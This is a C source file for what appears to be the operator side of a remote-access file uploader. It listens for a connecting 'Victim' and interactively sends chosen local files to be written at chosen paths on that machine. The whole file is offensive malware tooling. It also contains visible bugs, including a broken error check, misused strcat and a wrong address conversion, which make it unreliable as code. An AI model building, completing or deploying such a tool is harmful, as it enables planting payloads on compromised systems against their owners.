#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>

int  filesend(char filename[], int afd, char ip[], int portn);
int dbg(){
   static int t=1;
   printf ("Bebug Message Number %d\n",t);
   t++;
}

int main(int argc, char *argv[]){
   printf ("[+] Watining for a connection, please be patient\n");
   int osfd=socket(AF_INET,SOCK_STREAM,0);
   setsockopt(osfd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int));
   strcat(argv[1], "\0");
   filesend(argv[1],osfd, argv[2], atoi(argv[3]));
   return 0;
}
int ch(int var, char msg[]){
    if (var == -1){printf ("%s\n",msg);exit(1);}
}

int filesend(char filenam[],int afd, char ip[], int portn){
   struct sockaddr_in adr={ .sin_port=htons(portn), .sin_family=AF_INET };
   inet_pton(AF_INET,ip, &adr.sin_addr.s_addr);
   int bnd=bind(afd, (struct sockaddr*)&adr,sizeof(adr));
   ch(bnd,"Error in bind");
   int lsn=listen(afd,1);
   struct sockaddr_in vct;
   int vctl=sizeof(struct sockaddr_in);
   int sfd=accept(afd, (struct sockaddr*)&vct,(socklen_t*)&vctl);
   ch(sfd,"Error in accept");
   int vip=ntohl(vct.sin_addr.s_addr);
   char vii[16];
   inet_ntop(AF_INET, &vip, vii,sizeof(vii));
   printf ("Victim Connected (IP: %s) (Port: %d)\n",vii,ntohs(vct.sin_port));
   while (1){
   write(1,"[AFU] -> ",9);
   char filename[256];
   char dest[256];
   bzero(filename,sizeof(filename));
   bzero(dest, sizeof(dest));
   scanf("%s %s", filename,dest);
   if (strcmp(filename, "stop")==0){close(afd);close(sfd);exit(0);}
   if (strlen(dest)==0){printf ("[-] Missing destination\n"); continue;}
   int sfile=open(filename, O_RDONLY);
   char signal[10];
   if (sfile == -1){
     printf ("[-] Error: File %s Not Found\n",filename);
     sfile=0;
     continue;
   }
   strcat(filename,"\0");
   strcat(dest,"\0");
   struct stat ft;
   stat(filename,&ft);
   char ftssize[15]; sprintf(ftssize, "%d",ft.st_size);
   int ss=ft.st_size;
   char data[ss];
   read (sfile, data, sizeof(data));
   sleep(1);
   int snd= send(sfd,ftssize,strlen(ftssize),0);
   sleep(1);
   int snd2=send(sfd,&data, sizeof(data), 0);
   sleep(1);
   int snd3=send(sfd,dest, strlen(dest),0);
     if (snd != -1 | snd2 != -1 | snd3 != -1){
        printf ("[Z] File Uploaded (fd: %d)\n",sfd);
     }
     else {
        printf ("[Z] Error Occured During FileSend (ACE: %d |FSS: %d | FDS: %d | FNS: %d)\n",sfd,snd,snd2,snd3);
     }
   close (sfile);
   bzero(filename,sizeof(filename));
   }
}
